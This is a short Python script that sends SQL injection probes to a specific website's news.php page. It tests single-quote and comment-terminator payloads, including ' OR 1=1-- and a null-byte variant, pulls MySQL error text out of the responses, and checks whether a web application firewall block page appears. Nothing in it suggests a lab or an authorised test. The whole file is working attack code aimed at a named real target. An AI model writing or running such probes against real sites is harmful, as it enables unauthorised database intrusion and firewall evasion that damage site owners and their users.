#!/usr/bin/env python3
"""zagroup: find working comment terminator (-- / # / --+ / ;%00)"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(payload, tag):
    code, body = fetch(BASE + "?c=259" + payload)
    err = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    blocked = "云网盾" in body
    print("%-18s code=%s size=%d blocked=%s %s" % (tag, code, len(body), blocked,
          (err.group(1)[:90] if err else "OK(no err)")), flush=True)
    time.sleep(2)

print("=== comment terminators ===")
probe("%27", "quote-only")
probe("%27--%20", "dash-dash")
probe("%27--+", "dash-plus")
probe("%27%23", "hash")
probe("%27%23%0a", "hash-newline")
probe("%27;%00", "semicolon-null")
probe("%27%20OR%201=1--%20", "or-1=1-dd")
probe("%27%20OR%201=1%23", "or-1=1-hash")
